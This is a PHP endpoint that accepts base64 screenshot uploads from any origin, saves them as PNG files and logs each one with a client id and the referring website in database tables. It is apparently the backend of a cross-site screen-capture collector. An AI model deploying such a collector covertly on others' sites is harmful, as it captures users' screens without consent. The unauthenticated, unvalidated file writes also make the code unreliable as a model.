<?php
header("Access-Control-Allow-Origin: *");


require_once ('../includes/functions.php');

$data = $_POST['data'];
if(empty($data))
	die();

$url = $_SERVER['HTTP_REFERER'];
$jsTimestamp = substr($_GET["t"], 0, -3);


$clientUniq = $_GET["uid"];

$timelineUniq = md5($clientUniq . $jsTimestamp . $url."screencap");

$imageId = md5($clientUniq .$jsTimestamp.time(). $url);
$saveFile = "scr/".$imageId.".png";
/////////////////////////////////////////////////

$contents_split = explode(',', $data);
$encoded = $contents_split[count($contents_split) - 1];
$decoded = "";
for ($i = 0; $i < ceil(strlen($encoded) / 256); $i++) {
    $decoded = $decoded . base64_decode(substr($encoded, $i * 256, 256));
}

$data = $decoded;
$fp = fopen($saveFile, "w");
fwrite($fp, $data);
fclose($fp);


if (file_exists($saveFile)) {
    
    $db->bindMore(array(
        "client_id" => $clientUniq,
        "screencap_id" => $timelineUniq,
        "image_id" => $imageId,
        "page_load" => $jsTimestamp,
        "website" => $url
    ));
    
    $db->query("INSERT INTO screen_capture (`client_id`, `screencap_id`,  `image_id`, `page_load`, `website`, `time`) 
        	VALUES (:client_id, :screencap_id, :image_id, :page_load, :website, NOW() )");



    $db->bind("unique_id", $timelineUniq);
    $timelineCheck = $db->single("SELECT id FROM timeline WHERE unique_id = :unique_id");
    
    if (empty($timelineCheck)) {
        
        $db->bindMore(array(
            "client_id" => $clientUniq,
            "unique_id" => $timelineUniq,
            "page_load" => $jsTimestamp,
            "website" => $url,
            "type" => "screencap"
        ));
        
        $db->query("INSERT INTO timeline ( `client_id`, `unique_id`,  `page_load`, `website`, `type`, `time`) 
            VALUES (:client_id, :unique_id, :page_load, :website, :type, NOW() )");
    }

}

?>